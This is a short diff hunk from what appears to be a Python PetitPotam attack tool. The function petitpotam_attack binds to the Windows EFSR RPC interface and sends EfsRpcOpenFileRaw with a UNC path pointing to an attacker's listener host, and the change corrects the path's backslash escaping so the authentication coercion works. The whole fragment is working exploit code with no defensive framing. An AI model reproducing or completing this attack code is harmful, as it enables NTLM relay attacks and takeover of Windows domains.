@@ -100,7 +100,7 @@ def petitpotam_attack(listener_host, target_host):
     dce.bind(epm.MSRPC_UUID_EFSR)
     
     # Build the malicious path
-    malicious_path = f"\\{listener_host}\share\whatever"
+    malicious_path = f"\\\\{listener_host}\\share\\whatever"
     
     try:
         request = epm.EfsRpcOpenFileRaw()
